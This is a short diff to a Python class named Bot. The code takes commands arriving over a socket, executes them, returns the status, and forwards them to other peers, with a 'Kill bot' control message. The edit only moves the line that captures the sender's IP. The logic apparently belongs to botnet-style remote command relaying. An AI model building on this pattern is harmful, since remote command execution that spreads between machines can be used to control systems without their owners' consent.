@@ -58,9 +58,9 @@ class Bot:
                     cmd = command[2]
                     if id not in self.lastCmd:
                         self.lastCmd.add(id)
+                        origin = str(conn.getpeername()[0])
                         cmd_status = self.__executeCmd(cmd)
                         conn.send(str(cmd_status).encode())
-                        origin = str(conn.getpeername()[0])
                         print("connected to ", origin)
                         self.forwardCmd(data.decode(), origin)
                 elif data.decode() == "Kill bot":
